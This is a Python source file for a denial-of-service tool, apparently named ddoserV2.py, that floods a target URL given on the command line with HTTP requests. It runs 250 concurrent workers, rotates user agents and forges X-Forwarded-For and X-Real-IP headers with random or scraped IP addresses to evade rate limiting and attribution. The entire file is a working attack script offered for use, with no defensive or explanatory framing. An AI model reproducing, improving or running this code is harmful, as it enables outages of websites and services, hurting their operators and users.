import asyncio
import random
import time
from typing import List
import aiohttp
import re
import logging
import shutil
import sys

# Configure logger
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# User agents for request headers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# Proxy sources
proxy_sources = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
]

class CliAttacker:
    def __init__(self, target_url: str, num_requests: int):
        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 250
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self.proxy_list = []
    
    async def fetch_ip_addresses(self, url: str) -> List[str]:
        try:
            async with aiohttp.ClientSession() as session:
                response = await session.get(url, timeout=10)
                text = await response.text()
                return re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b', text)
        except Exception as e:
            logger.error(f"Failed to fetch IPs from {url}: {str(e)}")
            return []
    
    async def get_random_ip(self) -> str:
        if len(self.proxy_list) < 1000:
            self.proxy_list.extend([
                f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                for _ in range(1000)
            ])
        return random.choice(self.proxy_list)
    
    async def send_request(self, session: aiohttp.ClientSession, ip_address: str) -> None:
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "X-Real-IP": ip_address,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        
        try:
            async with session.get(
                self.target_url, 
                headers=headers, 
                timeout=aiohttp.ClientTimeout(total=3.0)
            ) as response:
                self.success_count += 1
                if self.success_count % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.success_count / elapsed if elapsed > 0 else 0
                    logger.info(f"Requests: {self.success_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
        except Exception:
            self.fail_count += 1
    
    async def fetch_proxies(self) -> List[str]:
        proxies = []
        for url in proxy_sources:
            ips = await self.fetch_ip_addresses(url)
            proxies.extend(ips)
        
        if len(proxies) < 1000:
            proxies.extend([
                f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                for _ in range(1000)
            ])
        return proxies
    
    async def send_requests_worker(self, session: aiohttp.ClientSession) -> None:
        while self.success_count < self.num_requests:
            ip_address = await self.get_random_ip()
            await self.send_request(session, ip_address)
    
    async def attack(self):
        self.start_time = time.time()
        logger.info("Fetching proxy list...")
        
        self.proxy_list = await self.fetch_proxies()
        logger.info(f"Loaded {len(self.proxy_list)} IPs | Starting attack...")
        
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                self.send_requests_worker(session) 
                for _ in range(self.max_concurrent)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - self.start_time
        logger.info(f"Attack completed: {self.success_count} successful, {self.fail_count} failed in {elapsed:.2f}s")
    
    def run(self):
        asyncio.run(self.attack())

def print_banner():
    columns = shutil.get_terminal_size().columns
    banner = r"""
    
█▀▄ █▀▄ █▀█ █▀ █▀
█▄▀ █▄▀ █▄█ ▄█ ▄█
█▄▄ █▄█   ▄█ █▄ █ █▀█ █▀
█▄█ ░█░   ░█ █ ▀█ █▄█ ▄█"""
    
    try:
        from colorama import Fore, init
        init()
        for line in banner.splitlines():
            print(f"{Fore.RED}{line.center(columns)}{Fore.RESET}")
    except ImportError:
        for line in banner.splitlines():
            print(line.center(columns))

if __name__ == "__main__":
    try:
        if len(sys.argv) < 3:
            print_banner()
            print("\nUsage: python3 ddoserV2.py <target_url> <num_requests>")
            print("Example: python3 ddoserV2.py http://example.com 1000")
            sys.exit(1)
        
        target_url = sys.argv[1]
        num_requests = int(sys.argv[2])
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"http://{target_url}"
        
        print_banner()
        logger.info(f"Starting attack on {target_url} with {num_requests} requests")
        
        attacker = CliAttacker(target_url, num_requests)
        attacker.run()
        
    except IndexError:
        print_banner()
        print("\nPlease provide a valid target URL and number of requests as arguments.")
        sys.exit(1)
    except ValueError:
        print("\nError: Number of requests must be an integer.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user.")
        sys.exit(0)
